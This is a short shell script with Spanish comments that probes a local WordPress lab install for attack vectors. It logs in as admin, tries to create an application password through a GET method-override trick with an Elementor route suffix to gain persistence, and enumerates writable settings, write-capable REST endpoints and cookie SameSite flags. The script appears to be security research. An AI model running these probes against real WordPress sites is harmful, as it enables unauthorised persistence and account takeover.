#!/bin/sh
# Sondas de nuevos vectores contra el lab (víctima 4.3.1, cookies de admin).
# Solo lectura + creación de un application password de prueba (borrable).
# Uso: sh research/investigacion/sonda_vectores.sh
B="${1:-http://localhost:8085}"
JAR=$(mktemp); trap 'rm -f $JAR' /tmp/probe-body 2>/dev/null; trap 'rm -f $JAR' EXIT
curl -s -c $JAR -o /dev/null $B/wp-login.php
curl -s -b $JAR -c $JAR -o /dev/null --data-urlencode "log=admin" --data-urlencode "pwd=admin" \
  --data-urlencode "wp-submit=Log In" --data-urlencode "testcookie=1" $B/wp-login.php

probe() {
  desc="$1"; url="$2"
  code=$(curl -s -g -b $JAR -o /tmp/probe-body -w '%{http_code}' "$url")
  echo "--- $desc -> HTTP $code"
  head -c 300 /tmp/probe-body; echo; echo
}

echo "======= V1: application password via GET (persistencia sin usuario nuevo) ======="
probe "POST /users/me/application-passwords" "$B/wp-json/wp/v2/users/me/application-passwords?_method=POST&name=sync-movil&x=elementor/v1/events/"

echo "======= V4: campos escribibles de /wp/v2/settings ======="
curl -s -g -b $JAR "$B/wp-json/wp/v2/settings?context=edit&x=elementor/v1/events/" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sorted(d.keys()))" 2>/dev/null || echo "(sin respuesta)"

echo
echo "======= V9: blast radius REST (endpoints de escritura) ======="
curl -s "$B/wp-json/" | python3 -c "
import json,sys
d=json.load(sys.stdin)
n=0
for route,handlers in d['routes'].items():
    for h in handlers.get('endpoints',[]):
        if set(h.get('methods',[])) & {'POST','PUT','PATCH','DELETE'}:
            n+=1
print('total rutas:',len(d['routes']),' endpoints con metodo de escritura:',n)"

echo
echo "======= V8: atributo SameSite de las cookies de WP ======="
curl -s -i $B/wp-login.php | grep -i "set-cookie" | head -3
